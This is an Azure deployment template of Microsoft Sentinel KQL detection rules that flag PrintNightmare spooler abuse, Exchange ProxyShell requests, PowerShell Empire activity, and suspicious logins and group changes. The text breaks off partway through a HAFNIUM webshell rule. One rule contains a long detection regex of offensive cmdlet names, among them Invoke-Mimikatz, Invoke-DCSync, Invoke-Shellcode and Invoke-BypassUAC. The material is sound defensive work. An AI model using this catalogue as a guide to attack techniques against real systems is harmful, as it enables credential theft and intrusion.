[
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-806')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-806')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-806: [RBA] Windows Events - Spoolsv Spawning Process",
          "description": "This rule attempts to detect suspicious spawning activity from spoolsv.exe (PrintNightMare) MITRE: T1574 Category: Windows Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);     \nlet ingested_lookback = 1h; // earliest [ingest time] boundary\n            let generated_lookback = 1h; // earliest [log time] boundary\n            let PreviousAlerts =\n             SecurityAlert\n            | where TimeGenerated between (ago(A806_SUPRESSION_THRESHOLD) .. now())\n            | parse AlertName with RuleNumber ':' *\n            | where RuleNumber == 'BV-806'\n            | extend Details = base64_decode_tostring(tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).['Custom Details'])).AlertData))[0]))\n            | extend Computer = tostring(parse_json(Details).Computer)\n            | extend NewProcess = tostring(parse_json(Details).Process)\n            | summarize NewProcesses=make_set(NewProcess) by Computer;\n            bv_parser_security_event\n            | where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n            | where EventID in (EventIDList)\n            | where ParentProcessName contains 'spoolsv.exe'\n            | join PreviousAlerts on Computer\n            | extend PrevouslyReported = iff( NewProcesses contains Process, true, false)\n            | where not(PrevouslyReported)\n            | where CommandLine matches regex A806_COMMANDLINE_EXCLUSION_REGEX == false\n            | project NewProcessName, ParentProcessName, SubjectUserName, SubjectDomainName, ProcessId, Process, Computer, PrevouslyReported, CommandLine\n            | extend AlertData = base64_encode_tostring(tostring(pack_all()))\n            | parse Computer with HostName '.' HostDnsDomain\n            | extend Class = 'RBA'\n            | extend Tags = 'tag: RBA'\n            | extend AlertName = strcat('BV-806: [', Class ,'] Spoolsv Spawning Process - Windows')\n            | extend Description = strcat('This rule attempts to detect supicious spawning activity from spoolsv.exe (PrintNightMare) ', Tags)",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1574"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "{{Description}}"
          },
          "customDetails": {
            "AlertData": "AlertData"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostDnsDomain"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Process"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-730')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-730')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-730: [SOC] Windows - Exchange ProxyShell Indicators",
          "description": "Looks at Web logs and Windows Security events for indicators. MITRE: T1574 Category: Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "//BV-730: [SOC] Windows - Exchange ProxyShell Indicators\n//https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4663\n//https://www.bleepingcomputer.com/news/microsoft/microsoft-exchange-servers-scanned-for-proxyshell-vulnerability-patch-now/\nlet EventIDList = dynamic(['4688']);         \nlet ingested_lookback = 15m; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet ExchangeServers = toscalar(\nW3CIISLog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where sSiteName =~ 'Exchange Back End'\n| summarize make_set(Computer));        \nunion isfuzzy=true \n(W3CIISLog\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where csUriStem contains \"/autodiscover/autodiscover.json\" and csUriQuery contains \"/mapi/nspi/\"\n| where scStatus !in (400,401,404)\n| where cIP !in (A730_EXCLUDED_IP)\n| where Computer in~ (ExchangeServers)\n| summarize\n    EventCount=count(),\n    TimeGenerated=min(TimeGenerated),\n    SourceIP=make_set(cIP),\n    SourceHost=make_set(SourceSystem),\n    SourceUserNames=make_set(csUserName)\n    ,HTTPStatus=make_set(scStatus)\n    by csUriStem, csUriQuery, TargetIP=sIP, TargetHost=Computer, LogSource='W3CIISLog'\n),\n(bv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Computer in~ (ExchangeServers)\n| where Process contains 'w3wp.exe' and ObjectName contains 'mapi'\n| project TimeGenerated,ProcessName, TargetHost=Computer, ObjectName, LogSource='Security Event', HttpStatus=dynamic([])\n)\n| parse TargetHost with TargetHostName '.' TargetHostDNS\n| extend URL=csUriQuery\n| extend SourceIP1 = SourceIP[0], SourceIP2=SourceIP[1], SourceIP3=SourceIP[2]\n| extend Event = pack('SourceIP', strcat_array(SourceIP, ','), 'URL',URL,'TargetIP', TargetIP, 'TargetHost', TargetHost, 'LogSourceHost', TargetHost, 'SystemAlertPlartform', 'Correlation', 'TimeGenerated', TimeGenerated, 'ProcessName', ProcessName, 'FileName', ObjectName, 'LogSource', LogSource)\n| extend ExtendedDescription = strcat('Source IP address', SourceIP, ' attemped a proxy shell attack on IP address ', TargetIP)\n| extend AttackerEntity = pack_array(SourceIP1, SourceIP2, SourceIP3), bv_mapping_tag = SourceIP\n| project TimeGenerated, Event, SourceIP, SourceIP1, SourceIP2, SourceIP3, URL, TargetHostName, TargetHostDNS, TargetIP, ObjectName, ProcessName, LogSource, AttackerEntity, ExtendedDescription, HTTPStatus, RBAScore = 3, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1574"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Looks at IIS Web logs and Windows Security events for indicators of proxy shell attacks.\n{{ExtendedDescription}}\ntag: SOC\nCategory: Windows Security\nMITRE: T1574"
          },
          "customDetails": {
            "Event": "Event",
            "AttackerEntity": "AttackerEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetHostDNS"
                },
                {
                  "identifier": "HostName",
                  "columnName": "TargetHostName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-727')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-727')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-727: [SOC] Windows - Powershell Empire",
          "description": "Identifies instances of PowerShell Empire cmdlets in powershell process command line data. MITRE: T1059 Category: Windows Security Events tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);     \nlet timeframe = 1d;\n            let regexEmpire = @'SetDelay|GetDelay|Set-LostLimit|Get-LostLimit|Set-Killdate|Get-Killdate|Set-WorkingHours|Get-WorkingHours|Get-Sysinfo|Add-Servers|Invoke-ShellCommand|Start-AgentJob|Update-Profile|Get-FilePart|Encrypt-Bytes|Decrypt-Bytes|Encode-Packet|Decode-Packet|Send-Message|Process-Packet|Process-Tasking|Get-Task|Start-Negotiate|Invoke-DllInjection|Invoke-ReflectivePEInjection|Invoke-Shellcode|Invoke-ShellcodeMSIL|Get-ChromeDump|Get-ClipboardContents|Get-IndexedItem|Get-Keystrokes|Invoke-Inveigh|Invoke-NetRipper|local:Invoke-PatchDll|Invoke-NinjaCopy|Get-Win32Types|Get-Win32Constants|Get-Win32Functions|Sub-SignedIntAsUnsigned|Add-SignedIntAsUnsigned|Compare-Val1GreaterThanVal2AsUInt|Convert-UIntToInt|Test-MemoryRangeValid|Write-BytesToMemory|Get-DelegateType|Get-ProcAddress|Enable-SeDebugPrivilege|Invoke-CreateRemoteThread|Get-ImageNtHeaders|Get-PEBasicInfo|Get-PEDetailedInfo|Import-DllInRemoteProcess|Get-RemoteProcAddress|Copy-Sections|Update-MemoryAddresses|Import-DllImports|Get-VirtualProtectValue|Update-MemoryProtectionFlags|Update-ExeFunctions|Copy-ArrayOfMemAddresses|Get-MemoryProcAddress|Invoke-MemoryLoadLibrary|Invoke-MemoryFreeLibrary|Out-Minidump|Get-VaultCredential|Invoke-DCSync|Translate-Name|Get-NetDomain|Get-NetForest|Get-NetForestDomain|Get-DomainSearcher|Get-NetComputer|Get-NetGroupMember|Get-NetUser|Invoke-Mimikatz|Invoke-PowerDump|Invoke-TokenManipulation|Exploit-JMXConsole|Exploit-JBoss|Invoke-Thunderstruck|Invoke-VoiceTroll|Set-WallPaper|Invoke-PsExec|Invoke-SSHCommand|Invoke-PSInject|Invoke-RunAs|Invoke-SendMail|Invoke-Rule|Get-OSVersion|Select-EmailItem|View-Email|Get-OutlookFolder|Get-EmailItems|Invoke-MailSearch|Get-SubFolders|Get-GlobalAddressList|Invoke-SearchGAL|Get-SMTPAddress|Disable-SecuritySettings|Reset-SecuritySettings|Get-OutlookInstance|New-HoneyHash|Set-MacAttribute|Invoke-PatchDll|Get-SecurityPackages|Install-SSP|Invoke-BackdoorLNK|New-ElevatedPersistenceOption|New-UserPersistenceOption|Add-Persistence|Invoke-CallbackIEX|Add-PSFirewallRules|Invoke-EventLoop|Invoke-PortBind|Invoke-DNSLoop|Invoke-PacketKnock|Invoke-CallbackLoop|Invoke-BypassUAC|Get-DecryptedCpassword|Get-GPPInnerFields|Invoke-WScriptBypassUAC|Get-ModifiableFile|Get-ServiceUnquoted|Get-ServiceFilePermission|Get-ServicePermission|Invoke-ServiceUserAdd|Invoke-ServiceCMD|Write-UserAddServiceBinary|Write-CMDServiceBinary|Write-ServiceEXE|Write-ServiceEXECMD|Restore-ServiceEXE|Invoke-ServiceStart|Invoke-ServiceStop|Invoke-ServiceEnable|Invoke-ServiceDisable|Get-ServiceDetail|Find-DLLHijack|Find-PathHijack|Write-HijackDll|Get-RegAlwaysInstallElevated|Get-RegAutoLogon|Get-VulnAutoRun|Get-VulnSchTask|Get-UnattendedInstallFile|Get-Webconfig|Get-ApplicationHost|Write-UserAddMSI|Invoke-AllChecks|Invoke-ThreadedFunction|Test-Login|Get-UserAgent|Test-Password|Get-ComputerDetails|Find-4648Logons|Find-4624Logons|Find-AppLockerLogs|Find-PSScriptsInPSAppLog|Find-RDPClientConnections|Get-SystemDNSServer|Invoke-Paranoia|Invoke-WinEnum{|Get-SPN|Invoke-ARPScan|Invoke-Portscan|Invoke-ReverseDNSLookup|Invoke-SMBScanner|New-InMemoryModule|Add-Win32Type|Export-PowerViewCSV|Get-MacAttribute|Copy-ClonedFile|Get-IPAddress|Convert-NameToSid|Convert-SidToName|Convert-NT4toCanonical|Get-Proxy|Get-PathAcl|Get-NameField|Convert-LDAPProperty|Get-NetDomainController|Add-NetUser|Add-NetGroupUser|Get-UserProperty|Find-UserField|Get-UserEvent|Get-ObjectAcl|Add-ObjectAcl|Invoke-ACLScanner|Get-GUIDMap|Get-ADObject|Set-ADObject|Get-ComputerProperty|Find-ComputerField|Get-NetOU|Get-NetSite|Get-NetSubnet|Get-DomainSID|Get-NetGroup|Get-NetFileServer|SplitPath|Get-DFSshare|Get-DFSshareV1|Get-DFSshareV2|Get-GptTmpl|Get-GroupsXML|Get-NetGPO|Get-NetGPOGroup|Find-GPOLocation|Find-GPOComputerAdmin|Get-DomainPolicy|Get-NetLocalGroup|Get-NetShare|Get-NetLoggedon|Get-NetSession|Get-NetRDPSession|Invoke-CheckLocalAdminAccess|Get-LastLoggedOn|Get-NetProcess|Find-InterestingFile|Invoke-CheckWrite|Invoke-UserHunter|Invoke-StealthUserHunter|Invoke-ProcessHunter|Invoke-EventHunter|Invoke-ShareFinder|Invoke-FileFinder|Find-LocalAdminAccess|Get-ExploitableSystem|Invoke-EnumerateLocalAdmin|Get-NetDomainTrust|Get-NetForestTrust|Find-ForeignUser|Find-ForeignGroup|Invoke-MapDomainTrust|Get-Hex|Create-RemoteThread|Get-FoxDump|Decrypt-CipherText|Get-Screenshot|Start-HTTP-Server|Local:Invoke-CreateRemoteThread|Local:Get-Win32Functions|Local:Inject-NetRipper|GetCommandLine|ElevatePrivs|Get-RegKeyClass|Get-BootKey|Get-HBootKey|Get-UserName|Get-UserHashes|DecryptHashes|DecryptSingleHash|Get-UserKeys|DumpHashes|Enable-SeAssignPrimaryTokenPrivilege|Enable-Privilege|Set-DesktopACLs|Set-DesktopACLToAllowEveryone|Get-PrimaryToken|Get-ThreadToken|Get-TokenInformation|Get-UniqueTokens|Find-GPOLocation|Find-GPOComputerAdmin|Get-DomainPolicy|Get-NetLocalGroup|Get-NetShare|Get-NetLoggedon|Get-NetSession|Get-NetRDPSession|Invoke-CheckLocalAdminAccess|Get-LastLoggedOn|Get-NetProcess|Find-InterestingFile|Invoke-CheckWrite|Invoke-UserHunter|Invoke-StealthUserHunter|Invoke-ProcessHunter|Invoke-EventHunter|Invoke-ShareFinder|Invoke-FileFinder|Find-LocalAdminAccess|Get-ExploitableSystem|Invoke-EnumerateLocalAdmin|Get-NetDomainTrust|Get-NetForestTrust|Find-ForeignUser|Find-ForeignGroup|Invoke-MapDomainTrust|Get-Hex|Create-RemoteThread|Get-FoxDump|Decrypt-CipherText|Get-Screenshot|Start-HTTP-Server|Local:Invoke-CreateRemoteThread|Local:Get-Win32Functions|Local:Inject-NetRipper|GetCommandLine|ElevatePrivs|Get-RegKeyClass|Get-BootKey|Get-HBootKey|Get-UserName|Get-UserHashes|DecryptHashes|DecryptSingleHash|Get-UserKeys|DumpHashes|Enable-SeAssignPrimaryTokenPrivilege|Enable-Privilege|Set-DesktopACLs|Set-DesktopACLToAllowEveryone|Get-PrimaryToken|Get-ThreadToken|Get-TokenInformation|Get-UniqueTokens|Invoke-ImpersonateUser|Create-ProcessWithToken|Free-AllTokens|Enum-AllTokens|Invoke-RevertToSelf|Set-Speaker(\\$Volume){\\$wshShell|Local:Get-RandomString|Local:Invoke-PsExecCmd|Get-GPPPassword|Local:Inject-BypassStuff|Local:Invoke-CopyFile\\(\\$sSource,|ind-Fruit|New-IPv4Range|New-IPv4RangeFromCIDR|Parse-Hosts|Parse-ILHosts|Exclude-Hosts|Get-TopPort|Parse-Ports|Parse-IpPorts|Remove-Ports|Write-PortscanOut|Convert-SwitchtoBool|Get-ForeignUser|Get-ForeignGroup';\n            let ProcessCreationEvents=() {\n            let processEvents=bv_parser_security_event\n            |where EventID in (EventIDList)\n            |project TimeGenerated, ComputerName = Computer, AccountName = SubjectUserName, AccountDomain = SubjectDomainName,\n              FileName = tostring(split(NewProcessName, @'\\\\')[-1]), ProcessCommandLine = CommandLine, \n            InitiatingProcessFileName = ParentProcessName, InitiatingProcessCommandLine = '', InitiatingProcessParentFileName = '';\n            processEvents};\n            let decodedPS = ProcessCreationEvents\n            | where TimeGenerated between (ago(timeframe) .. now())\n            | where ProcessCommandLine contains ' -encodedCommand'\n            | parse kind=regex flags=i ProcessCommandLine with * '-EncodedCommand ' encodedCommand\n            | project StartTimeUtc = TimeGenerated, encodedCommand = tostring(split(encodedCommand, ' ')[0]), ProcessCommandLine\n            // Note: currently the base64_decodestring function is limited to supporting UTF8\n            | extend decodedCommand = translate(@'\\0','', base64_decodestring(substring(encodedCommand, 0, strlen(encodedCommand) -  (strlen(encodedCommand) %8)))), encodedCommand, ProcessCommandLine , strlen(encodedCommand);\n            (decodedPS\n            | union \n            (ProcessCreationEvents\n            | where TimeGenerated between (ago(timeframe) .. now())\n            | where FileName in~ ('powershell.exe','powershell_ise.exe')\n            | where ProcessCommandLine !contains '-encodedcommand')\n            | extend StartTimeUtc = TimeGenerated\n            )\n            | where ProcessCommandLine matches regex regexEmpire\n            | extend timestamp = StartTimeUtc, AccountCustomEntity = AccountName, HostCustomEntity = ComputerName, bv_mapping_tag = AccountName",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-726')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-726')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-726: [Custom] Windows - Monitored Service Account Interactive Logins",
          "description": "This rule creates an alert for identified service accounts that login in interactively (Security Event 4624 Type 2, Type 3, and Type 10) MITRE: T1078 Category: Windows Security Events tag: Custom",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4624', '4625']);     \nlet ingested_lookback = 1d; // earliest [ingest time] boundary\nlet generated_lookback = 1d; // earliest [log time] boundary\nlet alert_bin = 1d;\nbv_parser_security_event\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where EventID in (EventIDList)\n| where LogonType in (2, 3, 10)\n| where WorkstationName != '-'\n| extend ExcludedWorkstation = iff(WorkstationName matches regex A726_EXCLUDED_WORKSTATION_REGEX, true, false)\n| where not(ExcludedWorkstation)\n| where 'DEFAULTINCLUDEDSERVICEACCOUNT' !in~ (A726_INCLUDED_SERVICE_ACCOUNTS)\n| where TargetUserName in~ (A726_INCLUDED_SERVICE_ACCOUNTS)\n| project\n    Account,\n    IpAddress,\n    Computer,\n    TargetUserName,\n    WorkstationName,\n    LogonType,\n    Status,\n    SubStatus,\n    TimeGenerated,\n    TargetDomainName\n| summarize First=min(TimeGenerated), Last=max(TimeGenerated), LoginCount=count(), WorkstationNames=make_set(WorkstationName) by TargetUserName, bin(TimeGenerated, alert_bin)\n| project First,Last,TargetUserName,LoginCount,WorkstationNames",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-721')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-721')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-721: [Custom] Windows - Failed Logins for Monitored Accounts",
          "description": "The rule alerts when there is failed login for a specified account MITRE: T1110 Category: Windows Security Events tag: Custom",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4625']);     \nlet ingested_lookback = 15m; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nlet alert_bin=15m;\nbv_parser_security_event\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where EventID in (EventIDList)\n| where TargetUserName !endswith '$'\n| where TargetUserName matches regex (A721_INCLUDED_ACCOUNTS_REGEX)\n| project IpAddress, LogonType, LogonProcessName, AuthenticationPackageName, Process, FailureReason, TimeGenerated, WorkstationName, Computer, Account, TargetUserName, TargetDomainName\n| summarize cnt=count(), LogSourceComputer=make_set(Computer), Workstations=make_set(WorkstationName), SrcIPAddr=make_set(IpAddress), Events=make_set(pack_all(), MaxSize=5), Count=count() by Account=Account, TargetUserName, TargetDomainName, bin_at(TimeGenerated, alert_bin, now())\n| where cnt >= 1\n| extend AlertData = ''\n| extend  ExtendedDetails = strcat('SourceIP: \\n', strcat_array(SrcIPAddr, ' \\n'), '\\nWorkstation \\n', strcat_array(Workstations, '\\n '), '\\nFailed Count: ', Count)\n| extend SrcIPAddr1 = SrcIPAddr[0]\n| project TimeGenerated, AlertData, Account, LogSourceComputer, Workstations, Events, Count, TargetUserName, TargetDomainName, SrcIPAddr, ExtendedDetails, SrcIPAddr1",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-721: [Custom] Failed Logins for Monitored Account - {{Account}}",
            "alertDescriptionFormat": "This rule alerts when there is failed login for a specified monitored accounts.\n\n{{ExtendedDetails}}\n \nMITRE: T1110 Category:  Windows Security tag: Custom'"
          },
          "customDetails": {
            "Workstations": "Workstations",
            "AlertData": "AlertData"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "TargetDomainName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIPAddr1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-719')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-719')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-719: [Custom] Windows - Modifications to Monitored AD Groups",
          "description": "The rule alerts when there is a modification to a specified AD group MITRE: T1098 Category: Windows Security Events tag: Custom",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4728', '4732', '4756', '4728', '4732', '4756']);     \nlet ingested_lookback = 1h; // earliest [ingest time] boundary\n            let generated_lookback = 1h; // earliest [log time] boundary\n            let alert_bin = 1h;\n            bv_parser_security_event\n            | where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n            | where EventID in (EventIDList)\n            | where TargetUserName in~ (A719_INCLUDED_GROUPS)\n            | parse EventData with * 'CN=' NewMember ',' *\n            | project Account, _ItemId, TimeGenerated, EventID, Activity, TargetUserName, SubjectAccount, NewMember\n            | summarize First=min(TimeGenerated), Last=max(TimeGenerated), Members=make_set(NewMember), Events=make_set(pack_all()), Count=count() by Account, bin(TimeGenerated, alert_bin)\n            | parse Account with NTDomain '\\\\' AccountName",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "NTDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-621')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-621')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-621: [SOC] Windows - M365 Device - HAFNIUM UM Service writing suspicious file",
          "description": "This query looks for the Exchange server UM process writing suspicious files that may be indicative of webshells. MITRE: T1543 Category: Microsoft Defender XDR,Windows Security Events tag: Zero-Day tag: SOC",
          "severity": "High",
          "enabled": true,
